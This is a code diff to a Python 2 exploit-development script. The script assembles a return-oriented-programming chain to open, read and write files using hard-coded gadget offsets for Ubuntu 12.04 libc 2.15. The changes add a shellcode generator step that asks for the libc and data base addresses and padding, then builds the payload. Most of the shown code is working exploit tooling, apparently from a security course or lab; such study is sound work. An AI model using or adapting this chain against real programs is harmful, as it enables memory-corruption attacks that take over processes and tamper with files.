@@ -1,5 +1,7 @@
 import re
 import sys
+
+from rop_shellcode import GenerateROPShellcode
  
 """
 This program is to create an ROP program to edit a specific file
@@ -174,10 +176,10 @@ def main():
     global rop_code
     global offset
  
-    if len(sys.argv) < 4:
+    if len(sys.argv) < 3:
         print 'Please enter the file to be edited and the file whose contents need to be read.'
  
-    if len(sys.argv) == 4 and sys.argv[3] == 'ubuntu12.04-libc2.15':
+    if sys.argv[len(sys.argv) - 1] == 'ubuntu12.04-libc2.15':
         pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
         mov_eax_ecx = 'ROP command: 0x2d987L: mov [eax] ecx ;;\\n'
         pop_ebx_ret = 'ROP command: 0x1930eL: pop ebx ;;\\n'
@@ -228,8 +230,18 @@ def main():
     open_file(sys.argv[1])
     write_file(sys.argv[2])
     close_file()
- 
-    print rop_code[:-2]
+
+    if len(sys.argv) > 3 and sys.argv[3] == 'print':
+        print rop_code[:-2]
+        sys.exit(0)
+
+    generator = GenerateROPShellcode(padding=0, _id=0, json_file=None)
+    generator.code = rop_code[:-2].replace('\\n', '\n')
+    generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
+    generator.data_base = hex(int(str(raw_input('Enter the data base (format - 0xdeadbeef): ')).replace('L', ''), 16))
+    generator.padding = int(raw_input('Padding: '))
+    generator.print_code = str(raw_input('Would you like to write the code into a file (y/n)? ')) == 'yes'
+    generator.construct_shellcode()
  
  
 if __name__ == '__main__':
